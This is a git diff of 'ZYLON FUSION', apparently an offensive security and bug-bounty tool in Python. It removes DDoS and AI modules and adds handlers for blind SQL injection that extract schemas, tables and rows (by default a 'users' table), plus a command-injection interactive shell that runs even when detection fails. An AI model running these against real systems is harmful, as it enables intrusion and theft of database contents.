@@ -97,7 +97,7 @@ from rich.panel import Panel
 from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
 from rich.text import Text
 from rich import box
-from rich.prompt import Prompt, Confirm, IntPrompt
+from rich.prompt import Prompt, Confirm
 from rich.layout import Layout
 from colorama import Fore, Back, Style, init as colorama_init
 from bs4 import BeautifulSoup
@@ -146,16 +146,8 @@ from core.bounty_workflow import BugBountyWorkflow
 from core.v2_recon import V2ReconEngine
 from core.v2_vuln import V2VulnEngine
 from core.origin_ip import OriginIPEngine
-from core.v3_security import V3SecurityEngine
-from core.v4_hunting import V4HuntingEngine
-from core.v5_async_engine import V5AsyncEngine
-from core.performance import (
-    dns_cache, optimized_session, adaptive_threads,
-    rate_limiter, smart_timeout, parallel_scanner,
-    get_performance_stats
-)
-from core.ddos_engine import DDoSDefenseEngine
-from core.battle_engine import BattleEngine
+from core.hakuin_engine import HakuinEngine, BlindSQLiDetector
+from core.cmd_injection_engine import CommandInjectionEngine
 
 # ============================================================================
 # SIGNAL HANDLER
@@ -192,8 +184,8 @@ class ZylonUI:
     ███████╗██║██║     ╚██████╔╝███████║
     ╚══════╝╚═╝╚═╝      ╚═════╝ ╚══════╝
 [/bold red]
-[bold yellow]    FUSION v2.3 NUCLEAR - Advanced Security & Bug Bounty Platform[/bold yellow]
-[bold cyan]    omino + wizard + Zylon Custom + V2 Nuclear + V4 Hunting + V5 Async + V6 Perf | Gemini AI | Termux Non-Root[/bold cyan]
+[bold yellow]    FUSION v2.0 NUCLEAR - Advanced Security & Bug Bounty Platform[/bold yellow]
+[bold cyan]    omino + wizard + Zylon Custom + V2.0 Nuclear Modules | Termux Non-Root[/bold cyan]
 """
         console.print(Panel(banner, border_style="bright_red", box=box.HEAVY))
         
@@ -284,46 +276,24 @@ class ZylonUI:
             ("53", "DNS History + Cert Transparency IP Hunt"),
             ("54", "Subdomain Resolution + CDN IP Filter"),
             ("55", "Direct IP Verification (Host Header)"),
+            # Hakuin-Optimized Blind SQLi (v3.0 Fusion)
+            ("56", "Blind SQLi Detector (Auto-Detect Vulnerability)"),
+            ("57", "Blind SQLi Schema Extraction (Hakuin-Optimized)"),
+            ("58", "Blind SQLi Metadata Extract (Tables + Columns)"),
+            ("59", "Blind SQLi Data Extraction (Binary Search - 10x Faster)"),
+            ("60", "Blind SQLi Full Pipeline (Detect + Extract All)"),
+            # Command Injection (Commix Fusion v3.0)
+            ("61", "Command Injection Detector (Commix Fusion)"),
+            ("62", "Command Injection + OS Detection"),
+            ("63", "Command Injection Shell (Interactive)"),
             ("42", "Bug Bounty Full Recon Pipeline"),
             ("43", "Bug Bounty Full Vuln Pipeline"),
-            # V4.0 Hunting Modules
-            ("76", "Username Enumeration Scanner"),
-            ("77", "DMARC/DKIM/SPF Email Security Checker"),
-            ("78", "CSRF Token Detection & Login CSRF Tester"),
-            ("79", "Framework Detection + Specific Attacks"),
-            ("80", "Client-Side JS Library Vulnerability Scanner"),
-            ("81", "403 Bypass Tester"),
-            ("82", "Cross-Domain Discovery"),
-            ("83", "CVE-to-Exploit Lookup Engine"),
-            # V5.0 Async Engine Modules
-            ("84", "Subdomain Brute Force (Active DNS + Wordlist)"),
-            ("85", "Directory Brute Force (Async High-Speed)"),
-            ("86", "AI Smart Scan (Gemini-Guided Auto Recon)"),
-            ("87", "AI Vulnerability Triage (Classify & Prioritize)"),
-            ("88", "AI Recon Advisor (Strategy Suggestions)"),
-            # V6.0 DDoS Defense Testing Modules
-            ("89", "HTTPS Flood Resilience Test (WAF/CDN Blocking Check)"),
-            ("90", "Slowloris Vulnerability Test (Connection Exhaustion)"),
-            ("91", "Slow POST Vulnerability Test (Slow Body Upload)"),
-            ("92", "Rate Limit Detection (Find Protection Threshold)"),
-            ("93", "Connection Capacity Test (Max Concurrent Connections)"),
-            ("ddos", "DDoS Defense Suite (All DDoS Tests)"),
-            ("battle", "Academy Battle Mode (Red vs Blue | SSH+Telnet | Any Network)"),
             ("99", "MEGA SCAN (Every Single Module)"),
-            ("beast", "BEAST MODE (AI-Guided Full Arsenal + Smart Workflow)"),
-            ("ai", "AI Chat (Gemini-Powered Security Assistant)"),
-            ("aianalyze", "AI Analyze Last Scan Results"),
-            ("aireport", "AI Generate Bug Bounty Report"),
-            ("aipayload", "AI Generate Custom Payloads"),
-            ("aitriage", "AI Triage Findings (Prioritize & Classify)"),
-            ("aitest", "AI Test Connection to Gemini API"),
-            ("smart", "AI Smart Scan (Quick Recon + AI Recommendations)"),
-            ("wordlists", "Show Built-in Wordlist Stats"),
+            ("ai", "AI-Powered Vulnerability Analysis (Experimental)"),
             ("scope", "Set/Check Bug Bounty Scope"),
             ("poc", "Generate PoC for Last Finding"),
             ("config", "Configuration Manager (API Keys)"),
             ("report", "View/Export Previous Scan Reports"),
-            ("perf", "Performance Stats (DNS Cache, Threads, Speed)"),
             ("update", "Check for Updates"),
             ("fix", "Install Missing Dependencies"),
             ("exit/quit/q", "Exit ZYLON FUSION"),
@@ -396,44 +366,16 @@ class ZylonFusion:
         
         # Origin IP Finder Engine
         self.origin_ip = OriginIPEngine(self.session)
-
-        # V3.0 Security Engine (20 New Modules)
-        self.v3_security = V3SecurityEngine(self.session)
-
-        # V4.0 Hunting Engine (8 New Modules)
-        self.v4_hunting = V4HuntingEngine(self.session)
-
-        # V5.0 Async Engine (High-Performance + Wordlists + AI Smart Scan)
-        self.v5_async = V5AsyncEngine(self.session)
-
-        # DDoS Defense Testing Engine
-        self.ddos = DDoSDefenseEngine(self.session)
-
-        # Academy Battle Engine (Red Team vs Blue Team)
-        self.battle = BattleEngine()
-
-        # Initialize Gemini API key (hardcoded default + config file)
-        self._init_gemini()
-
-        # Performance Engine
-        self.dns_cache = dns_cache
-        self.perf_session = optimized_session
-        self.adaptive_threads = adaptive_threads
-        self.rate_limiter = rate_limiter
-
-    def _init_gemini(self):
-        """Initialize Gemini API key - hardcoded default, env var overrides"""
-        # Use hardcoded key from var.py as default
-        if GEMINI_API_KEY:
-            self.ai.set_gemini_key(GEMINI_API_KEY)
-
-        # Environment variable can override
-        env_key = os.environ.get('GEMINI_API_KEY', '')
-        if env_key:
-            self.ai.set_gemini_key(env_key)
+        
+        # Hakuin-Optimized Blind SQLi Engine (v3.0 Fusion)
+        self.hakuin = HakuinEngine(self.session)
+        self.blind_sqli_detector = BlindSQLiDetector(self.session)
+        
+        # Command Injection Engine (Commix Fusion v3.0)
+        self.cmd_inject = CommandInjectionEngine(self.session)
     
     def set_target(self, target):
-        """Validate and set target, auto-detect HTTP/HTTPS"""
+        """Validate and set target"""
         target = target.strip()
         # Remove protocol if user included it
         if '://' in target:
@@ -444,45 +386,8 @@ class ZylonFusion:
             return False, "Invalid target - must contain a domain or IP"
         
         self.target = target
-        
-        # Auto-detect protocol: try HTTPS first, fallback to HTTP
-        self.protocol = self._detect_protocol(target)
-        
-        self.parsed_target = urlparse(f"{self.protocol}{target}")
-        proto_label = "HTTPS" if self.protocol == "https://" else "HTTP"
-        return True, f"Target set: {target} ({proto_label})"
-    
-    def _detect_protocol(self, target):
-        """Auto-detect if target supports HTTPS, fallback to HTTP"""
-        # Try HTTPS first
-        try:
-            resp = self.session.get(
-                f"https://{target}", 
-                timeout=8, 
-                verify=False, 
-                allow_redirects=True
-            )
-            if resp.status_code < 500:
-                return "https://"
-        except Exception:
-            pass
-        
-        # Fallback to HTTP
-        try:
-            resp = self.session.get(
-                f"http://{target}", 
-                timeout=8, 
-                allow_redirects=True
-            )
-            if resp.status_code < 500:
-                console.print("[yellow]    HTTPS unavailable, using HTTP[/yellow]")
-                return "http://"
-        except Exception:
-            pass
-        
-        # Default to HTTPS even if both fail (might be temporary)
-        console.print("[yellow]    Cannot verify connectivity, defaulting to HTTPS[/yellow]")
-        return "https://"
+        self.parsed_target = urlparse(f"https://{target}")
+        return True, f"Target set: {target}"
     
     def run_scan(self, scan_type):
         """Run a specific scan type"""
@@ -551,52 +456,19 @@ class ZylonFusion:
             '53': self._scan_dns_cert_hunt,
             '54': self._scan_subdomain_origin,
             '55': self._scan_ip_verify,
+            # Hakuin-Optimized Blind SQLi (v3.0 Fusion)
+            '56': self._scan_blind_sqli_detect,
+            '57': self._scan_blind_sqli_schemas,
+            '58': self._scan_blind_sqli_meta,
+            '59': self._scan_blind_sqli_data,
+            '60': self._scan_blind_sqli_full,
+            # Command Injection (Commix Fusion v3.0)
+            '61': self._scan_cmd_inject_detect,
+            '62': self._scan_cmd_inject_os,
+            '63': self._scan_cmd_inject_shell,
             '42': self._scan_bounty_recon,
             '43': self._scan_bounty_vuln,
-            # V3.0 Security Modules (56-75)
-            '56': self._scan_graphql,
-            '57': self._scan_dom_xss,
-            '58': self._scan_reverse_ip,
-            '59': self._scan_dns_zone_transfer,
-            '60': self._scan_cache_deception,
-            '61': self._scan_clickjacking,
-            '62': self._scan_csp,
-            '63': self._scan_account_takeover,
-            '64': self._scan_oauth,
-            '65': self._scan_http_method,
-            '66': self._scan_shodan_internetdb,
-            '67': self._scan_favicon_hash,
-            '68': self._scan_pastebin_dork,
-            '69': self._scan_url_shortener,
-            '70': self._scan_security_robots,
-            '71': self._scan_blind_xss,
-            '72': self._scan_websocket,
-            '73': self._scan_2fa_bypass,
-            '74': self._scan_mixed_content,
-            '75': self._scan_info_disclosure,
-            # V4.0 Hunting Modules (76-83)
-            '76': self._scan_username_enum,
-            '77': self._scan_email_security,
-            '78': self._scan_csrf,
-            '79': self._scan_framework,
-            '80': self._scan_js_libraries,
-            '81': self._scan_403_bypass,
-            '82': self._scan_cross_domain,
-            '83': self._scan_cve_lookup,
-            # V5.0 Async Engine Modules (84-86)
-            '84': self._scan_subdomain_brute,
-            '85': self._scan_dir_brute_async,
-            '86': self._scan_smart,
-            '87': self._scan_ai_triage,
-            '88': self._scan_ai_recon_advisor,
-            # V6.0 DDoS Defense Testing (89-93)
-            '89': self._scan_ddos_https_flood,
-            '90': self._scan_ddos_slowloris,
-            '91': self._scan_ddos_slow_post,
-            '92': self._scan_ddos_rate_limit,
-            '93': self._scan_ddos_connection_capacity,
             '99': self._scan_mega,
-            'beast': self._scan_beast,
         }
         
         scan_func = scan_map.get(scan_type)
@@ -1827,6 +1699,403 @@ class ZylonFusion:
         else:
             console.print("[bold yellow][!] No IPs could be verified as origin[/bold yellow]")
     
+    # ========================================================================
+    # HAKUIN-OPTIMIZED BLIND SQLi SCANS (v3.0 Fusion)
+    # Fused from: github.com/pruzko/hakuin - 10x faster blind SQLi extraction
+    # ========================================================================
+    
+    def _scan_blind_sqli_detect(self):
+        """Blind SQLi Vulnerability Detector - Auto-detect blind SQLi"""
+        console.print(f"\n[bold magenta][*] Blind SQLi Detection on {self.target}[/bold magenta]")
+        console.print("[dim]Hakuin-Optimized Engine | Testing boolean-based & time-based inference[/dim]")
+        
+        url = f"{self.protocol}{self.target}"
+        
+        with console.status("[bold magenta]Testing for blind SQLi vulnerabilities...[/bold magenta]"):
+            # First, find parameters to test
+            params_to_test = ['id', 'page', 'q', 'search', 'user', 'item', 'cat',
+                            'category', 'pid', 'uid', 'sid', 'tid', 'nid', 'lid',
+                            'sort', 'order', 'limit', 'offset', 'action', 'type',
+                            'status', 'role', 'year', 'month', 'date', 'view']
+            
+            all_results = []
+            for param in params_to_test:
+                result = self.blind_sqli_detector.detect(url, param=param)
+                if result.get('vulnerable'):
+                    all_results.append(result)
+        
+        self.results['findings']['blind_sqli'] = {
+            'vulnerable': len(all_results) > 0,
+            'findings': all_results,
+        }
+        
+        if all_results:
+            console.print("[bold red][!] Blind SQLi Vulnerability Detected![/bold red]")
+            d_table = Table(title="Blind SQLi Vulnerabilities", box=box.HEAVY, border_style="red")
+            d_table.add_column("Parameter", style="bold red")
+            d_table.add_column("Type", style="yellow")
+            d_table.add_column("DBMS", style="cyan")
+            d_table.add_column("Inference", style="green")
+            for r in all_results:
+                inference = r.get('inference_config', {})
+                inf_str = f"{inference.get('inference_type', '?')}:{inference.get('inference_content', '?')}"
+                d_table.add_row(
+                    r.get('param', '?'),
+                    r.get('type', '?'),
+                    r.get('dbms', 'unknown'),
+                    inf_str,
+                )
+            console.print(d_table)
+            
+            console.print("\n[bold cyan][*] Use scan 57-60 for data extraction with Hakuin optimization[/bold cyan]")
+        else:
+            console.print("[bold green][+] No blind SQLi vulnerabilities detected[/bold green]")
+    
+    def _scan_blind_sqli_schemas(self):
+        """Blind SQLi Schema Extraction - Hakuin-Optimized Binary Search"""
+        console.print(f"\n[bold magenta][*] Blind SQLi Schema Extraction on {self.target}[/bold magenta]")
+        console.print("[dim]Hakuin Binary Search | ~7 requests per character (vs 128 linear)[/dim]")
+        
+        url = f"{self.protocol}{self.target}"
+        
+        # Ask for injection configuration
+        console.print("\n[bold yellow]Configure Blind SQLi Extraction:[/bold yellow]")
+        console.print("[dim]Example URL: https://target.com/page?id={query}[/dim]")
+        inject_url = Prompt.ask("[cyan]Injection URL (with {query} tag)[/cyan]", default=f"{url}?id={{query}}")
+        dbms = Prompt.ask("[cyan]DBMS Type[/cyan]", choices=['mysql', 'postgres', 'sqlite', 'mssql', 'oracle'], default='mysql')
+        inf_type = Prompt.ask("[cyan]Inference Method[/cyan]", choices=['status', 'header', 'body'], default='body')
+        inf_content = Prompt.ask("[cyan]True Condition Marker[/cyan]", default='true')
+        negated = Confirm.ask("[cyan]Negate inference?[/cyan]", default=False)
+        
+        self.hakuin.setup_inference(
+            url=inject_url,
+            inference_type=inf_type,
+            inference_content=inf_content,
+            negated=negated,
+            dbms=dbms,
+        )
+        
+        # Test connection
+        console.print("[bold cyan]Testing injection point...[/bold cyan]")
+        if not self.hakuin.inference.test_connection():
+            console.print("[bold red][!] Injection point not working! Check your configuration.[/bold red]")
+            return
+        
+        console.print("[bold green][+] Injection point verified![/bold green]")
+        
+        with console.status("[bold magenta]Extracting schema names (binary search)...[/bold magenta]"):
+            schemas = self.hakuin.extract_schemas()
+        
+        self.results['findings']['blind_sqli_schemas'] = schemas
+        
+        if schemas:
+            s_table = Table(title="Extracted Schemas", box=box.ROUNDED, border_style="magenta")
+            s_table.add_column("#", style="dim")
+            s_table.add_column("Schema Name", style="bold cyan")
+            for i, schema in enumerate(schemas, 1):
+                s_table.add_row(str(i), schema)
+            console.print(s_table)
+        else:
+            console.print("[yellow][!] No schemas extracted[/yellow]")
+        
+        stats = self.hakuin.get_stats()
+        console.print(f"[dim]Requests: {stats.get('total_requests', 0)} | Errors: {stats.get('errors', 0)}[/dim]")
+    
+    def _scan_blind_sqli_meta(self):
+        """Blind SQLi Metadata Extraction - Tables + Columns"""
+        console.print(f"\n[bold magenta][*] Blind SQLi Metadata Extraction on {self.target}[/bold magenta]")
+        console.print("[dim]Hakuin Binary Search | Extracting table & column names[/dim]")
+        
+        url = f"{self.protocol}{self.target}"
+        inject_url = Prompt.ask("[cyan]Injection URL (with {query} tag)[/cyan]", default=f"{url}?id={{query}}")
+        dbms = Prompt.ask("[cyan]DBMS Type[/cyan]", choices=['mysql', 'postgres', 'sqlite', 'mssql', 'oracle'], default='mysql')
+        inf_type = Prompt.ask("[cyan]Inference Method[/cyan]", choices=['status', 'header', 'body'], default='body')
+        inf_content = Prompt.ask("[cyan]True Condition Marker[/cyan]", default='true')
+        negated = Confirm.ask("[cyan]Negate inference?[/cyan]", default=False)
+        schema_name = Prompt.ask("[cyan]Schema name (leave blank for default)[/cyan]", default="")
+        
+        self.hakuin.setup_inference(
+            url=inject_url,
+            inference_type=inf_type,
+            inference_content=inf_content,
+            negated=negated,
+            dbms=dbms,
+        )
+        
+        if not self.hakuin.inference.test_connection():
+            console.print("[bold red][!] Injection point not working![/bold red]")
+            return
+        
+        with console.status("[bold magenta]Extracting metadata (tables + columns)...[/bold magenta]"):
+            meta = self.hakuin.extract_meta(schema=schema_name or None)
+        
+        self.results['findings']['blind_sqli_meta'] = meta
+        
+        if meta:
+            m_table = Table(title="Database Metadata", box=box.HEAVY, border_style="magenta")
+            m_table.add_column("Table", style="bold red")
+            m_table.add_column("Columns", style="cyan")
+            m_table.add_column("Column Count", style="yellow")
+            for table, columns in meta.items():
+                col_str = ', '.join(columns) if columns else '[]'
+                m_table.add_row(table, col_str[:80], str(len(columns)))
+            console.print(m_table)
+        else:
+            console.print("[yellow][!] No metadata extracted[/yellow]")
+        
+        stats = self.hakuin.get_stats()
+        console.print(f"[dim]Requests: {stats.get('total_requests', 0)} | Errors: {stats.get('errors', 0)}[/dim]")
+    
+    def _scan_blind_sqli_data(self):
+        """Blind SQLi Data Extraction - Binary Search (10x Faster)"""
+        console.print(f"\n[bold magenta][*] Blind SQLi Data Extraction on {self.target}[/bold magenta]")
+        console.print("[dim]Hakuin Binary Search | Character-by-character with optimization[/dim]")
+        
+        url = f"{self.protocol}{self.target}"
+        inject_url = Prompt.ask("[cyan]Injection URL (with {query} tag)[/cyan]", default=f"{url}?id={{query}}")
+        dbms = Prompt.ask("[cyan]DBMS Type[/cyan]", choices=['mysql', 'postgres', 'sqlite', 'mssql', 'oracle'], default='mysql')
+        inf_type = Prompt.ask("[cyan]Inference Method[/cyan]", choices=['status', 'header', 'body'], default='body')
+        inf_content = Prompt.ask("[cyan]True Condition Marker[/cyan]", default='true')
+        negated = Confirm.ask("[cyan]Negate inference?[/cyan]", default=False)
+        table_name = Prompt.ask("[cyan]Table name to extract[/cyan]", default="users")
+        column_name = Prompt.ask("[cyan]Column name (leave blank for all)[/cyan]", default="")
+        schema_name = Prompt.ask("[cyan]Schema name (leave blank for default)[/cyan]", default="")
+        
+        self.hakuin.setup_inference(
+            url=inject_url,
+            inference_type=inf_type,
+            inference_content=inf_content,
+            negated=negated,
+            dbms=dbms,
+        )
+        
+        if not self.hakuin.inference.test_connection():
+            console.print("[bold red][!] Injection point not working![/bold red]")
+            return
+        
+        console.print(f"[bold cyan]Extracting data from {table_name}...[/bold cyan]")
+        
+        with console.status("[bold magenta]Extracting data (binary search optimization)...[/bold magenta]"):
+            data = self.hakuin.extract_data(
+                table=table_name,
+                column=column_name or None,
+                schema=schema_name or None,
+            )
+        
+        self.results['findings']['blind_sqli_data'] = data
+        
+        if data:
+            for col, values in data.items():
+                d_table = Table(title=f"Column: {col}", box=box.ROUNDED, border_style="magenta")
+                d_table.add_column("#", style="dim")
+                d_table.add_column("Value", style="bold red")
+                for i, val in enumerate(values[:50], 1):
+                    d_table.add_row(str(i), str(val) if val is not None else '[NULL]')
+                console.print(d_table)
+                if len(values) > 50:
+                    console.print(f"[yellow]... and {len(values) - 50} more rows[/yellow]")
+        else:
+            console.print("[yellow][!] No data extracted[/yellow]")
+        
+        stats = self.hakuin.get_stats()
+        console.print(f"[dim]Total Requests: {stats.get('total_requests', 0)} | Errors: {stats.get('errors', 0)}[/dim]")
+    
+    def _scan_blind_sqli_full(self):
+        """Blind SQLi Full Pipeline - Detect + Extract All Data"""
+        console.print(f"\n[bold magenta][*] Blind SQLi Full Pipeline on {self.target}[/bold magenta]")
+        console.print("[dim]Hakuin-Optimized | Auto-detect + Full extraction[/dim]")
+        
+        url = f"{self.protocol}{self.target}"
+        
+        # Phase 1: Auto-detect
+        console.print("\n[bold cyan]Phase 1: Auto-detecting blind SQLi...[/bold cyan]")
+        with console.status("[bold magenta]Scanning for vulnerable parameters...[/bold magenta]"):
+            params_to_test = ['id', 'page', 'q', 'search', 'user', 'item', 'cat',
+                            'uid', 'sid', 'tid', 'nid', 'pid', 'lid']
+            detected = None
+            for param in params_to_test:
+                result = self.blind_sqli_detector.detect(url, param=param)
+                if result.get('vulnerable'):
+                    detected = result
+                    break
+        
+        if not detected:
+            console.print("[bold yellow][!] No blind SQLi auto-detected. Configure manually.[/bold yellow]")
+            inject_url = Prompt.ask("[cyan]Injection URL (with {query} tag)[/cyan]", default=f"{url}?id={{query}}")
+            dbms = Prompt.ask("[cyan]DBMS Type[/cyan]", choices=['mysql', 'postgres', 'sqlite', 'mssql', 'oracle'], default='mysql')
+            inf_type = 'body'
+            inf_content = 'true'
+            negated = False
+        else:
+            console.print(f"[bold green][+] Blind SQLi found on parameter: {detected.get('param', '?')}[/bold green]")
+            console.print(f"  Type: {detected.get('type', '?')} | DBMS: {detected.get('dbms', 'unknown')}")
+            inf_config = detected.get('inference_config', {})
+            inf_type = inf_config.get('inference_type', 'body')
+            inf_content = inf_config.get('inference_content', 'true')
+            negated = inf_config.get('negated', False)
+            dbms = detected.get('dbms', 'mysql') or 'mysql'
+            param = detected.get('param', 'id')
+            inject_url = f"{url}?{param}={{query}}"
+        
+        self.hakuin.setup_inference(
+            url=inject_url,
+            inference_type=inf_type,
+            inference_content=inf_content,
+            negated=negated,
+            dbms=dbms,
+        )
+        
+        if not self.hakuin.inference.test_connection():
+            console.print("[bold red][!] Injection verification failed![/bold red]")
+            return
+        
+        # Phase 2: Extract schemas
+        console.print("\n[bold cyan]Phase 2: Extracting schemas...[/bold cyan]")
+        with console.status("[bold magenta]Binary search schema extraction...[/bold magenta]"):
+            schemas = self.hakuin.extract_schemas()
+        if schemas:
+            console.print(f"  [green]*[/green] Found {len(schemas)} schemas: {', '.join(schemas[:10])}")
+        
+        # Phase 3: Extract tables
+        console.print("\n[bold cyan]Phase 3: Extracting table names...[/bold cyan]")
+        with console.status("[bold magenta]Binary search table extraction...[/bold magenta]"):
+            tables = self.hakuin.extract_tables()
+        if tables:
+            console.print(f"  [green]*[/green] Found {len(tables)} tables: {', '.join(tables[:10])}")
+        
+        # Phase 4: Extract metadata for top tables
+        console.print("\n[bold cyan]Phase 4: Extracting column names...[/bold cyan]")
+        all_meta = {}
+        for table in tables[:10]:  # Limit to first 10 tables
+            with console.status(f"[bold magenta]Extracting columns for {table}...[/bold magenta]"):
+                columns = self.hakuin.extract_columns(table=table)
+            all_meta[table] = columns
+            if columns:
+                console.print(f"  [green]*[/green] {table}: {', '.join(columns[:10])}")
+        
+        self.results['findings']['blind_sqli_full'] = {
+            'schemas': schemas,
+            'tables': tables,
+            'metadata': all_meta,
+            'stats': self.hakuin.get_stats(),
+        }
+        
+        # Display summary
+        if all_meta:
+            summary_table = Table(
+                title="Blind SQLi Extraction Summary",
+                box=box.HEAVY, border_style="magenta"
+            )
+            summary_table.add_column("Table", style="bold red")
+            summary_table.add_column("Columns", style="cyan")
+            summary_table.add_column("Count", style="yellow")
+            for table, columns in all_meta.items():
+                col_str = ', '.join(columns) if columns else '[]'
+                summary_table.add_row(table, col_str[:80], str(len(columns)))
+            console.print(summary_table)
+        
+        stats = self.hakuin.get_stats()
+        console.print(f"\n[bold green][+] Extraction Complete![/bold green]")
+        console.print(f"[dim]Total Requests: {stats.get('total_requests', 0)} | Errors: {stats.get('errors', 0)}[/dim]")
+        console.print(f"[dim]Use scan 59 to extract actual data from specific tables/columns[/dim]")
+    
+    # ========================================================================
+    # COMMAND INJECTION SCANS (Commix Fusion v3.0)
+    # Fused from: github.com/commixproject/commix
+    # ========================================================================
+    
+    def _scan_cmd_inject_detect(self):
+        """Command Injection Detector - Commix Fusion"""
+        console.print(f"\n[bold red][*] Command Injection Detection on {self.target}[/bold red]")
+        console.print("[dim]Commix Fusion Engine | Testing boolean-based & time-based CMDi[/dim]")
+        
+        url = f"{self.protocol}{self.target}"
+        
+        with console.status("[bold red]Testing for command injection vulnerabilities...[/bold red]"):
+            result = self.cmd_inject.scan_detect(url)
+        
+        self.results['findings']['cmd_injection'] = result
+        
+        if result.get('vulnerable'):
+            console.print("[bold red][!] Command Injection Vulnerability Detected![/bold red]")
+            v_table = Table(title="Command Injection Findings", box=box.HEAVY, border_style="red")
+            v_table.add_column("Parameter", style="bold red")
+            v_table.add_column("Type", style="yellow")
+            v_table.add_column("Separator", style="cyan")
+            v_table.add_column("Prefix", style="green")
+            v_table.add_column("Suffix", style="magenta")
+            for f in result.get('findings', []):
+                v_table.add_row(
+                    str(f.get('parameter', '')),
+                    str(f.get('type', '')),
+                    str(f.get('separator', '')),
+                    str(f.get('prefix', '')),
+                    str(f.get('suffix', '')),
+                )
+            console.print(v_table)
+            console.print("\n[bold cyan][*] Use scan 62 for OS detection, scan 63 for interactive shell[/bold cyan]")
+        else:
+            console.print("[bold green][+] No command injection vulnerabilities detected[/bold green]")
+    
+    def _scan_cmd_inject_os(self):
+        """Command Injection + OS Detection - Commix Fusion"""
+        console.print(f"\n[bold red][*] Command Injection + OS Detection on {self.target}[/bold red]")
+        console.print("[dim]Commix Fusion Engine | Detecting target operating system[/dim]")
+        
+        url = f"{self.protocol}{self.target}"
+        
+        with console.status("[bold red]Detecting OS and command injection...[/bold red]"):
+            result = self.cmd_inject.scan_detect_os(url)
+        
+        self.results['findings']['cmd_injection_os'] = result
+        
+        if result.get('vulnerable'):
+            console.print("[bold red][!] Command Injection Detected![/bold red]")
+            os_info = result.get('os', 'unknown')
+            console.print(f"  [bold yellow]Target OS: {os_info.upper()}[/bold yellow]")
+            
+            v_table = Table(title="Command Injection + OS", box=box.HEAVY, border_style="red")
+            v_table.add_column("Parameter", style="bold red")
+            v_table.add_column("Type", style="yellow")
+            v_table.add_column("OS", style="bold cyan")
+            v_table.add_column("Separator", style="green")
+            for f in result.get('findings', []):
+                v_table.add_row(
+                    str(f.get('parameter', '')),
+                    str(f.get('type', '')),
+                    os_info,
+                    str(f.get('separator', '')),
+                )
+            console.print(v_table)
+            
+            console.print("\n[bold cyan][*] Use scan 63 for interactive shell[/bold cyan]")
+        else:
+            console.print("[bold green][+] No command injection vulnerabilities detected[/bold green]")
+    
+    def _scan_cmd_inject_shell(self):
+        """Command Injection Interactive Shell - Commix Fusion"""
+        console.print(f"\n[bold red][*] Command Injection Shell on {self.target}[/bold red]")
+        console.print("[dim]Commix Fusion Engine | Interactive pseudo-shell[/dim]")
+        
+        url = f"{self.protocol}{self.target}"
+        
+        console.print("\n[bold yellow]Configure Command Injection:[/bold yellow]")
+        inject_url = Prompt.ask("[cyan]Target URL[/cyan]", default=url)
+        param = Prompt.ask("[cyan]Vulnerable parameter[/cyan]", default="id")
+        technique = Prompt.ask("[cyan]Technique[/cyan]", choices=['auto', 'classic', 'blind'], default='auto')
+        
+        # Quick detect first
+        with console.status("[bold red]Detecting injection point...[/bold red]"):
+            detect_result = self.cmd_inject.detect(inject_url, param=param)
+        
+        if not detect_result.get('vulnerable'):
+            console.print("[bold yellow][!] Auto-detection didn't find CMDi. Trying anyway...[/bold yellow]")
+        
+        console.print("[bold green][+] Launching interactive shell! Type 'exit' to quit.[/bold green]")
+        console.print("[dim]Commands: help, os, technique, tamper, separator, exit[/dim]")
+        
+        self.cmd_inject.get_shell(inject_url, param)
+    
     def _scan_bounty_recon(self):
         """Bug Bounty Full Recon Pipeline - All recon modules"""
         console.print(f"\n[bold yellow][*] BUG BOUNTY RECON PIPELINE on {self.target}[/bold yellow]")
@@ -2201,2022 +2470,24 @@ class ZylonFusion:
         self._scan_tech_cve()
         # Origin IP Finder
         self._scan_origin_ip_quick()
-        # V3.0 Security Modules
-        self._scan_graphql()
-        self._scan_dom_xss()
-        self._scan_clickjacking()
-        self._scan_csp()
-        self._scan_http_method()
-        self._scan_shodan_internetdb()
-        self._scan_security_robots()
-        self._scan_mixed_content()
-        self._scan_info_disclosure()
-        # V4.0 Hunting Modules
-        self._scan_username_enum()
-        self._scan_email_security()
-        self._scan_csrf()
-        self._scan_framework()
-        self._scan_js_libraries()
-        self._scan_403_bypass()
-        self._scan_cross_domain()
-        self._scan_cve_lookup()
         # Generate mega report
         self.reports.generate_html_report(self.results, self.target)
         console.print(f"\n[bold green][+] MEGA SCAN COMPLETE! Full report generated.[/bold green]")
-
-    # ========================================================================
-    # BEAST MODE - AI-Guided Full Arsenal with Smart Workflow
-    # ========================================================================
-
-    def _scan_beast(self):
-        """BEAST MODE - AI-Guided full arsenal with intelligent workflow"""
-        start_time = time.time()
-        
-        # Initialize results dict with 'findings' key - CRITICAL for all scan functions
-        self.results = {'target': self.target, 'scan_type': 'beast_mode',
-                       'timestamp': datetime.now().isoformat(), 'findings': {}}
-        
-        console.print(f"\n[bold red]")
-        console.print(Panel(
-            "[bold white]   BEAST MODE ACTIVATED[/bold white]\n"
-            "[bold red]   AI-Guided Full Arsenal | Smart Workflow[/bold red]\n"
-            f"[bold yellow]   Target: {self.target}[/bold yellow]",
-            border_style="bold red",
-            box=box.HEAVY
-        ))
-
-        # ========== PHASE 1: PASSIVE RECON (No interaction with target) ==========
-        console.print(f"\n[bold yellow][PHASE 1] Passive Reconnaissance[/bold yellow]")
-        phase1_scans = [
-            ('1', 'WHOIS Lookup', self._scan_whois),
-            ('3', 'DNS Enumeration', self._scan_dns),
-            ('4', 'Subdomain Discovery', self._scan_subdomains),
-            ('84', 'Subdomain Brute Force', self._scan_subdomain_brute),
-            ('77', 'Email Security', self._scan_email_security),
-            ('53', 'DNS History + Cert IP Hunt', self._scan_dns_cert_hunt),
-        ]
-        for scan_id, name, func in phase1_scans:
-            try:
-                console.print(f"  [cyan]-> Running {name}...[/cyan]")
-                func()
-            except Exception as e:
-                console.print(f"  [red]  X {name} error: {str(e)[:50]}[/red]")
-
-        # ========== PHASE 2: ACTIVE RECON (Light interaction) ==========
-        console.print(f"\n[bold yellow][PHASE 2] Active Reconnaissance[/bold yellow]")
-        phase2_scans = [
-            ('0', 'Full Recon', self._scan_full_recon),
-            ('5', 'Port Scanner', self._scan_ports),
-            ('7', 'Security Headers', self._scan_headers),
-            ('8', 'SSL/TLS Analysis', self._scan_ssl),
-            ('19', 'WAF Detection', self._scan_waf),
-            ('20', 'Tech Fingerprinting', self._scan_techstack),
-            ('52', 'CDN/WAF Detection', self._scan_cdn_detection),
-            ('54', 'Subdomain Resolution + CDN Filter', self._scan_subdomain_origin),
-            ('70', 'Security.txt / Robots.txt', self._scan_security_robots),
